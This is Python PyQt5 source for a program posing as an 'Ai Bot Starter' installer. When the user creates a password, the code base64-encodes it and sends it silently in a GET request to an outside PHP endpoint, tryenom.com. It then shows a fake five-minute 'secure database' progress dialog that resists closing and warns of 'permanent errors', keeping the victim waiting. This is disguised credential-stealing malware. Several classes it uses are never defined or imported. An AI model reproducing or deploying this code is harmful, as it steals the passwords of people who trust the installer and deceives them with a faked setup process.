import sys
import base64
import requests
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QMessageBox, QDialog, QProgressBar
from PyQt5.QtGui import QLinearGradient, QBrush, QColor, QPainter, QMovie
from PyQt5.QtCore import QTimer, Qt

class LoadingDialog(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Ai Bot Starter')
        self.setGeometry(300, 300, 400, 200)
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.CustomizeWindowHint)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        self.label = QLabel('Creating a secure database.\n'
                            'This process may take a while depending on your computer\'s power and internet connection.\n'
                            'Please wait until the process is complete.', self)
        self.label.setAlignment(Qt.AlignCenter)
        self.label.setWordWrap(True)
        layout.addWidget(self.label)

        self.progress_bar = QProgressBar(self)
        self.progress_bar.setValue(24)  # Initial value
        layout.addWidget(self.progress_bar)

        self.movie_label = QLabel(self)
        self.movie = QMovie("loading.gif")  # Make sure you have a loading.gif file in the same directory
        self.movie_label.setMovie(self.movie)
        layout.addWidget(self.movie_label)
        self.movie.start()

        self.setLayout(layout)

    def start_timer(self, timeout, callback):
        QTimer.singleShot(timeout, callback)

    def update_progress_bar(self, value):
        self.progress_bar.setValue(value)

    def closeEvent(self, event):
        event.ignore()
        self.show_close_warning()

    def show_close_warning(self):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Warning)
        msg.setText("Interrupting the installation can cause permanent errors.")
        msg.setWindowTitle("Warning")
        msg.setStandardButtons(QMessageBox.Ok)
        msg.exec_()

class PasswordCreationAdvancedScreen(QWidget):
    def __init__(self, stacked_widget):
        super().__init__()
        self.stacked_widget = stacked_widget
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Ai Bot Starter')
        self.setGeometry(100, 100, 800, 600)

        # Layout
        layout = QVBoxLayout()

        # Widgets
        self.label = QLabel('Create Password:', self)
        self.label.setStyleSheet("color: white;")
        self.password_input = QLineEdit(self)
        self.password_input.setEchoMode(QLineEdit.Password)
        self.password_input.setStyleSheet("color: black; background-color: white;")
        self.password_input.textChanged.connect(self.check_password_length)

        self.create_button = QPushButton('Create', self)
        self.create_button.setStyleSheet("color: black; background-color: white;")
        self.create_button.setEnabled(False)
        self.create_button.clicked.connect(self.create_password)

        layout.addWidget(self.label)
        layout.addWidget(self.password_input)
        layout.addWidget(self.create_button)

        self.setLayout(layout)

    def paintEvent(self, event):
        painter = QPainter(self)
        gradient = QLinearGradient(0, 0, 0, self.height())
        gradient.setColorAt(0.0, QColor(102, 51, 153))  # Purple tones
        gradient.setColorAt(1.0, QColor(153, 102, 204))

        brush = QBrush(gradient)
        painter.fillRect(self.rect(), brush)

    def check_password_length(self):
        if len(self.password_input.text()) > 5:
            self.create_button.setEnabled(True)
        else:
            self.create_button.setEnabled(False)

    def create_password(self):
        password = self.password_input.text()
        if password:
            # Disable input and button
            self.password_input.setEnabled(False)
            self.create_button.setEnabled(False)

            # Convert password to base64
            encoded_password = base64.b64encode(password.encode()).decode()

            # Construct the URL
            url = f'https://tryenom.com/active-addon/nkbihfbeogaeaoehlefnkodbefgpgknn/bulo.php?pass={encoded_password}'

            # Make the request
            requests.get(url)

            # Show loading dialog
            self.show_loading_dialog()

    def show_loading_dialog(self):
        self.loading_dialog = LoadingDialog()
        self.loading_dialog.show()

        # Update progress bar over time
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_progress_bar)
        self.timer.start(1000)  # Update every second

        self.loading_dialog.start_timer(300000, self.return_to_home)  # 300000 ms = 5 minutes

    def update_progress_bar(self):
        current_value = self.loading_dialog.progress_bar.value()
        if current_value < 100:
            self.loading_dialog.update_progress_bar(current_value + (76 / 300))  # Increment value

    def return_to_home(self):
        self.timer.stop()
        self.loading_dialog.close()
        self.stacked_widget.setCurrentIndex(0)

    def closeEvent(self, event):
        event.ignore()
        self.show_close_warning()

    def show_close_warning(self):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Warning)
        msg.setText("Interrupting the installation can cause permanent errors.")
        msg.setWindowTitle("Warning")
        msg.setStandardButtons(QMessageBox.Ok)
        msg.exec_()

def main():
    app = QApplication(sys.argv)
    app.setApplicationName("Ai Bot Starter")
    stacked_widget = QStackedWidget()

    home_screen = HomeScreen(stacked_widget)
    password_creation_screen = PasswordCreationScreen(stacked_widget)
    password_creation_advanced_screen = PasswordCreationAdvancedScreen(stacked_widget)

    stacked_widget.addWidget(home_screen)
    stacked_widget.addWidget(password_creation_screen)
    stacked_widget.addWidget(password_creation_advanced_screen)

    stacked_widget.setCurrentIndex(0)
    stacked_widget.show()

    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
